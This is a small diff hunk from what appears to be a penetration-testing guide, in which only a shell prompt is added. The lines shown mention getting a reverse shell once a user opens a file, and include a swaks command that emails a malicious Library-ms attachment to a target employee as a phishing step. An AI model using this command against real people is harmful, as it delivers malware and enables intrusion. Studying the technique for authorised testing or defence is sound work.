@@ -334,5 +334,5 @@ Once the user opens it, you have your reverse shell! If this doesn't work, Try H
 If you have to send the file over email, try to use swaks! You will need the username and password of the sending account.
 
 ```console
-swaks -t jane.doe@targetorg.com --from pwnd@targetorg.com -attach config.Library-ms --server 111.111.111.111 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
+$ swaks -t jane.doe@targetorg.com --from pwnd@targetorg.com -attach config.Library-ms --server 111.111.111.111 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
